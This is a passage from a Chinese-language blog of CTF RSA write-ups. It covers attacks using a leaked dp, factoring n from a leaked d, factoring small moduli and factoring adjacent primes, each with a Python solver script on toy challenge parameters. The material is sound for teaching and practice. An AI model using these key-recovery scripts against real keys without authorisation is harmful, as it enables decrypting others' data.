class="hljs-number">128</span>)<br>d = inverse(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><br>dp = d % (p-<span class="hljs-number">1</span>)<br><br>m = bytes_to_long(flag)<br><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;dp = <span class="hljs-subst">&#123;dp&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 108280026722298796068968170303156759745471686664814404724171434502249429011870583595808692893118419248225924869164875379709992190884930717654004006466664403479467573176438601715156464950045121937338569942817256182277141174728470067308962244296992229214749863655518517510026063088263849891990324547823192559069</span><br><span class="hljs-string">e = 305691242207901867366357529364270390903</span><br><span class="hljs-string">c = 26537258289122728220745496185201994733321402056894636636642710319261241111675937946139938310952968353253866895253865273981912174303818938005932883052177988834834575591342856235464380238486868448329727891268391728758132913642966389278296932186703733187105516710825918064228397602264185334108934765627411913661</span><br><span class="hljs-string">dp = 2656631506624565349527023729530989647164022271235521672257622068579788839123502046687139927161669209201953909023994372208117081512139181611949631467292513</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="exp-9">exp</h3><p>上一题中最后我们发现未知数k是一个小于<em>e</em>的数，所以我们采用了遍历[1,<em>e</em>)的方式来进行爆破，但这种方法不总是可行，例如在本题中<em>e</em>是128为的素数，显然我们不能去爆破它了。</p><p>本题可以看作10的升级版，比赛中其实会有很多的升级版本，这里可以分析一下条件</p><p>在RSA中，我们不仅有P10中e*dp的关系，还有其他我们可以利用的条件，由欧拉降幂有</p><p><span class="math inline">\(a^{e*dp}≡a^{e*dp \mod (p-1)}≡a\modp\)</span></p><p>则：<span class="math inline">\(a^{e*dp}-a≡0\mod p\)</span>，即$a^{e<em>dp} - a = k</em>p$</p><p>所以<spanclass="math inline">\((a^{e*dp}-a)|p\)</span>，显然我们已经攻破了本题，接下来我们需要求解<spanclass="math inline">\((a^{e*dp}-a)\)</span>和n的最大公因数即可。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311291345449.png"alt="image-20231129134524369" /><figcaption aria-hidden="true">image-20231129134524369</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#其实是这种类型题的通解</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">108280026722298796068968170303156759745471686664814404724171434502249429011870583595808692893118419248225924869164875379709992190884930717654004006466664403479467573176438601715156464950045121937338569942817256182277141174728470067308962244296992229214749863655518517510026063088263849891990324547823192559069</span><br>e = <span class="hljs-number">305691242207901867366357529364270390903</span><br>c = <span class="hljs-number">26537258289122728220745496185201994733321402056894636636642710319261241111675937946139938310952968353253866895253865273981912174303818938005932883052177988834834575591342856235464380238486868448329727891268391728758132913642966389278296932186703733187105516710825918064228397602264185334108934765627411913661</span><br>dp = <span class="hljs-number">2656631506624565349527023729530989647164022271235521672257622068579788839123502046687139927161669209201953909023994372208117081512139181611949631467292513</span><br><br>a = getPrime(<span class="hljs-number">64</span>)<br>pp = <span class="hljs-built_in">pow</span>(a, e*dp, n) - a<br><br>p = GCD(n, pp)<br>q = n // p<br>d = inverse(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>或者：</p><p><strong>⭐一招鲜吃遍天？</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> xenny.ctf.crypto.modern.asymmetric.rsa <span class="hljs-keyword">import</span> dpleak<br><br>n = <span class="hljs-number">108280026722298796068968170303156759745471686664814404724171434502249429011870583595808692893118419248225924869164875379709992190884930717654004006466664403479467573176438601715156464950045121937338569942817256182277141174728470067308962244296992229214749863655518517510026063088263849891990324547823192559069</span><br>e = <span class="hljs-number">305691242207901867366357529364270390903</span><br>c = <span class="hljs-number">26537258289122728220745496185201994733321402056894636636642710319261241111675937946139938310952968353253866895253865273981912174303818938005932883052177988834834575591342856235464380238486868448329727891268391728758132913642966389278296932186703733187105516710825918064228397602264185334108934765627411913661</span><br>dp = <span class="hljs-number">2656631506624565349527023729530989647164022271235521672257622068579788839123502046687139927161669209201953909023994372208117081512139181611949631467292513</span><br><br>m = dpleak.attack(dp,c,e=e,n=n)<br>flag = long_to_bytes( m )<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="rsa212d泄露攻击">[RSA2]12(d泄露攻击)</h2><h3 id="main-11">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br><br><span class="hljs-keyword">assert</span> p &lt; q<br><br>n = p*q<br>e = <span class="hljs-number">65537</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = invert(e, phi)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;d = <span class="hljs-subst">&#123;d&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag is NSSCTF&#123;md5(p)&#125;&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 113917408220469425995764932761465306974540330325378601642830241920567032775895088098706711486764203845425248022960733155994427766750033219106642310531864450654102562104771892268897793145789045570107312401570269581223945259704851104645493075550316424129401227653740942495625720165869565257394427181127734628103</span><br><span class="hljs-string">d = 15762135247924329080208071933121250646888501386858311483546464344350547831176536290630826247188272280853810047335214127264865205744683174860903496832368687060941437002920094364116706593296591581117381565805322046922482804679245558495134876677733584718947309975077159564300049936769192724856722338627154192353</span><br><span class="hljs-string">flag is NSSCTF&#123;md5(p)&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="exp-10">exp</h3><p>简化为（先知道结果，证明过程先略略😎）：</p><p>本题我们的目标不再是求解明文，而是考虑当私钥已经泄露的情况，能否利用公私钥来进行因数分解。</p><p>首先有一个定理 <span class="math display">\[r \equiv s(\bmod \phi(n)) \Leftrightarrow a^r \equiv a^s(\bmod n)\\也就是说我们可以将模n的同余幂式转换成其指数部分模ϕ(n)下的同余式。\\其中ϕ(n) = φ(n)/g，g=gcd(p-1,q-1)\]</span> 所以有：<span class="math inline">\(e * d \equiv 1(\bmod\phi(n)) \Rightarrow a^{e * d} \equiv a(\bmod n)\)</span></p><p>我们令 <span class="math inline">\(e * d-1=2^s * t\)</span></p><p>使得 <span class="math inline">\(t\)</span> 是一个奇数，这样我们遍历<span class="math inline">\([1, s]\)</span>，假设能够找到满足下列关系式的式子 <span class="math inline">\(a^{2^i *t} \equiv 1(\bmod n)\)</span> 且 <span class="math inline">\(a^{2^{i-1}* t} \not \equiv \pm 1(\bmod n)\)</span></p><p>就会有 <span class="math inline">\(\operatorname{gcd}\left(a^{2^{i-1}* t}-1, n\right)=p\)</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>n = <span class="hljs-number">113917408220469425995764932761465306974540330325378601642830241920567032775895088098706711486764203845425248022960733155994427766750033219106642310531864450654102562104771892268897793145789045570107312401570269581223945259704851104645493075550316424129401227653740942495625720165869565257394427181127734628103</span><br>d = <span class="hljs-number">15762135247924329080208071933121250646888501386858311483546464344350547831176536290630826247188272280853810047335214127264865205744683174860903496832368687060941437002920094364116706593296591581117381565805322046922482804679245558495134876677733584718947309975077159564300049936769192724856722338627154192353</span><br>e = <span class="hljs-number">65537</span><br><br>t = e * d - <span class="hljs-number">1</span><br>s = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span>(t % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>):<br>    t = t // <span class="hljs-number">2</span><br>    s += <span class="hljs-number">1</span><br><br><span class="hljs-comment"># 此时 e * d - 1 = ( 2^s ) * t</span><br>p = <span class="hljs-number">2</span><br>q = <span class="hljs-number">2</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,s):<br>    c1 = powmod(<span class="hljs-number">2</span>,powmod(<span class="hljs-number">2</span>,i,n) * t , n )<br>    c2 = powmod(<span class="hljs-number">2</span>,powmod(<span class="hljs-number">2</span>,(i-<span class="hljs-number">1</span>),n) * t, n )<br>    <span class="hljs-keyword">if</span>(c2 != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> c2 != n-<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> c1 == <span class="hljs-number">1</span> ):<br>        p = gcd(c2 - <span class="hljs-number">1</span>,n)<br>        q = n // p<br>        <span class="hljs-keyword">break</span><br><br><br><span class="hljs-keyword">if</span> p &gt; q:<br>    p, q = q, p  <span class="hljs-comment">#交换</span><br><br>flag = md5(<span class="hljs-built_in">str</span>(p).encode()).hexdigest()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;NSSCTF&#123;&quot;</span>+flag+<span class="hljs-string">&quot;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><blockquote><p>参考： <ahref="https://blog.csdn.net/m0_74345946/article/details/131192056?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%5BRSA1%5DP4&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-131192056.nonecase&amp;spm=1018.2226.3001.4187">Crypto--RSA系列_iroot函数_yolocth的博客-CSDN博客</a></p><p><a href="https://www.ruanx.net/rsa-solutions/">CTF RSA题解集(ruanx.net)</a></p><p><a href="https://shimo.im/docs/Dy5ekHJhKo0ap5v3/read">NewStarCTF 2023Week2 官方WriteUp (shimo.im)</a></p><p><a href="https://www.ruanx.net/rsa-solutions/">CTF RSA题解集(ruanx.net)</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF-Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Crypto</tag>
      
      <tag>RSA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto系列——RSA（一）</title>
    <link href="/2023/09/14/Crypto%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94RSA%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2023/09/14/Crypto%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94RSA%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>不知道为啥就对密码学感兴趣了，上学期学了半天pwn没搞懂，或许就不适合学pwn吧😭</p><p>《从0开始的密码学世界生活》😋慢慢学密码方向</p><p>在探姬的建议下，还是买了这套课程，开干！</p><h2 id="rsa1p1">[RSA1]P1</h2><h3 id="main.py">main.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p*q<br>e = <span class="hljs-number">65537</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br>m = bytes_to_long(flag)<br><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p = <span class="hljs-subst">&#123;p&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;q = <span class="hljs-subst">&#123;q&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p = 10554915510546378513140074459658086644656654144905337809416976066414771647836950941616441505897207397834928781511863699153349798682451297889979721668885951</span><br><span class="hljs-string">q = 8246403321715011123191410826902524505032643184038566851264109473851746507405534573077909160292816825514872584170252311902322051822644609979417178306809223</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">c = 40005881669517895877352756665523238535105922590962714344556374248977905431683140065629966778249773228248201807844489945346731806741025157651474530811920115794270396320935022110691338083709019538562205165553541077855422953438117902279834449006455379382431883650004540282758907332683496655914597029545677184720</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="decrypt.py">decrypt.py</h3><p><strong>已知p,q,e,c,可直接求出d,然后求出m</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">10554915510546378513140074459658086644656654144905337809416976066414771647836950941616441505897207397834928781511863699153349798682451297889979721668885951</span><br>q = <span class="hljs-number">8246403321715011123191410826902524505032643184038566851264109473851746507405534573077909160292816825514872584170252311902322051822644609979417178306809223</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">40005881669517895877352756665523238535105922590962714344556374248977905431683140065629966778249773228248201807844489945346731806741025157651474530811920115794270396320935022110691338083709019538562205165553541077855422953438117902279834449006455379382431883650004540282758907332683496655914597029545677184720</span><br><br>n = p * q<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br>d = <span class="hljs-built_in">pow</span>(e,-<span class="hljs-number">1</span>,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(m))   <span class="hljs-comment"># b&#x27;NSSCTF&#123;now!you_know_rsa&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>关于类型的转换，pepper师傅这里说的很好，我就直接copy了</p><p>本题需要理解明文和密文的类型及其类型转换函数。<strong>long类型为一串数字</strong>，<strong>bytes是字符</strong>。</p><p>在下列示例中，message表示bytes类型明文，m表示long类型明文，c表示long类型密文。</p><p>在rsa.py函数中：</p><ol type="1"><li><p>输入 message 明文为 bytes 类型,加密 c=pow(m,e,n) 中明文 m 为 long类型，输出密文 c 是 long 类型。</p><p>message 到 m 需要通过 bytes_to_long(message) 方法进行转换</p></li><li><p>解密 m= pow(c, d, n) 中 m 为 long 类型，c 为 long 类型。</p><p>打印输出的明文 message 需要 bytes 类型，通过 long_to_bytes(m)方法进行转换</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">m = bytes_to_long(message) <span class="hljs-built_in">bytes</span>转long<br>message = long_to_bytes(m) long转<span class="hljs-built_in">bytes</span><br></code></pre></td></tr></table></figure><hr /><h2 id="rsa1p2">[RSA1]P2</h2><h3 id="main_py">main_py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br>p = getPrime(<span class="hljs-number">256</span>)<br>q = getPrime(<span class="hljs-number">256</span>)<br>n = p*q<br>e = <span class="hljs-number">65537</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br>m = bytes_to_long(flag)<br><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 7382582015733895208810490097582153009797420348201515356767397357174775587237553842395468027650317457503579404097373070312978350435795210286224491315941881</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">c = 6511001389892474870028836129813814173158254564777610289284056550272120510686249909340499673868720839756059423749304765055919251717618117507007046973023557</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="decrypt.py-1">decrypt.py</h3><p><strong>已知n,e,c,分解n，得到p,q</strong></p><p>本题意思是只知道了n，而p和q都不知道，那么我们就要把n这个大整数分解，用到网站<ahref="http://factordb.com/">factordb.com</a></p><p>得到分解的两个数p和q，即可写出decrypt.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">7382582015733895208810490097582153009797420348201515356767397357174775587237553842395468027650317457503579404097373070312978350435795210286224491315941881</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">6511001389892474870028836129813814173158254564777610289284056550272120510686249909340499673868720839756059423749304765055919251717618117507007046973023557</span><br><br>p = <span class="hljs-number">70538125404512947763739093348083497980212021962975762144416432920656660487657</span><br>q = <span class="hljs-number">104660876276442216612517835199819767034152013287345576481899196023866133215633</span><br><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br>d = <span class="hljs-built_in">pow</span>(e,-<span class="hljs-number">1</span>,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><hr /><h2 id="rsa1p3">[RSA1]P3</h2><h3 id="main_py-1">main_py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br>p = getPrime(<span class="hljs-number">128</span>)<br>q = getPrime(<span class="hljs-number">128</span>)<br>n = p*q<br>e = <span class="hljs-number">65537</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br>m = bytes_to_long(flag)<br><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 53690629441472827148854210396580805205350972614395425306316047967905824330731</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">c = 22130296334673852790451396673112575082637108306697684532954477845025885087040</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="decrypt.py-2">decrypt.py</h3><p><strong>已知n,e,c,yafu分解n，得到p,q</strong></p><p>虽然它说是要让用yafu，命令为：<code>.\yafu-x64.exe "factor(@)" -batchfile 1.txt</code></p><p><ahref="https://wiki.mrskye.cn/Crypto/yafu安装及使用/">yafu安装及使用 -SkYe Wiki (mrskye.cn)</a></p><p>但我寻思这个数比上面的数还小，直接<ahref="http://factordb.com/">factordb.com</a>不就行辣😋</p><p>求出p和q后，解密函数跟<strong>[RSA1]P2</strong>一样</p><hr /><h2 id="rsa1p4">[RSA1]P4</h2><h3 id="main_py-2">main_py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = gmpy2.next_prime(p)<br>n = p*q<br>e = <span class="hljs-number">65537</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br>m = bytes_to_long(flag)<br><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 115637000420176820831322601039129424406844427046456738651883381559357542765613732363445112111006849040385859313572091386802534464534403117787314180179562651607533039692795522388596550968316951090748054495960090527479954143448774136390568881020918710834542819900918984139672802889774720153267841255456602500057</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">c = 98161406745910866780822530171878255235776133393411573803496865047700715941955255328757920065032397556905095591171977170479344602512244671081108703687450560269408412671849929423399172588599903975793985819498354819305128607934552101433664794909855378636055525016664559476808490723554481335856183927702549281730</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="decrypt.py-3">decrypt.py</h3><p><strong>已知n,e,c，且p,q相差不大（特例款）。</strong></p><p>直接copy了xenny师傅的wp，😰😢</p><ul><li>本题的关键是<code>q = gmpy2.next_prime(p)</code>，相当于q是p的下一个素数</li><li>然后这里可以采用一个<spanclass="math inline">\(\sqrt{n}\)</span>，因为<spanclass="math inline">\(n = p*q\)</span>，考虑n的算术平方根为<spanclass="math inline">\(sn = \sqrt{n}\)</span>，同时 sn也是p和q的几何平均值。所以有<spanclass="math inline">\(p&lt;sn&lt;q\)</span></li><li>又有p，q是相邻的素数，p的下一个素数为q，同理也有sn的下一个素数也应该是q，</li><li>然后由q求出p即可</li></ul><p>这里附上一篇文章：<ahref="https://www.freebuf.com/articles/database/290623.html">浅析RSA因子大小相近时分解因子攻击方法- FreeBuf网络安全行业门户</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>p = getPrime(<span class="hljs-number">512</span>)<br>q = gmpy2.next_prime(p)<br><br>n = <span class="hljs-number">115637000420176820831322601039129424406844427046456738651883381559357542765613732363445112111006849040385859313572091386802534464534403117787314180179562651607533039692795522388596550968316951090748054495960090527479954143448774136390568881020918710834542819900918984139672802889774720153267841255456602500057</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">98161406745910866780822530171878255235776133393411573803496865047700715941955255328757920065032397556905095591171977170479344602512244671081108703687450560269408412671849929423399172588599903975793985819498354819305128607934552101433664794909855378636055525016664559476808490723554481335856183927702549281730</span><br><br>sn = isqrt(n)      <span class="hljs-comment">#或者sn = gmpy2.iroot(n,2)</span><br>q = next_prime(sn)<br>p = n // q<br><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = invert(e, phi)<br><br>m = <span 